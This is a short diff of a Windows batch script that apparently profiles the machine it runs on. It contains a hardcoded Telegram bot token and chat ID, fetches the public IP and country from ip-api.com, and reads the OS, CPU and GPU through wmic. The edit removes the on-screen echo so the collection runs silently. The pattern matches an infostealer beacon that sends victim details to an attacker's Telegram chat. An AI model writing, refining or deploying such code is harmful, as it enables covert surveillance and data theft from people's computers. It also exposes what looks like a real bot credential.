@@ -1,7 +1,7 @@
 setlocal EnableDelayedExpansion
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
-for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%%a" & set "IP=%%b" & echo Country: !Country! & echo IP: !IP!)
+for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%%a" & set "IP=%%b")
 for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value') do set "Windows=%%a"
 for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do set "CPU=%%a"
 for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get caption /value') do set "GPU=%%a"
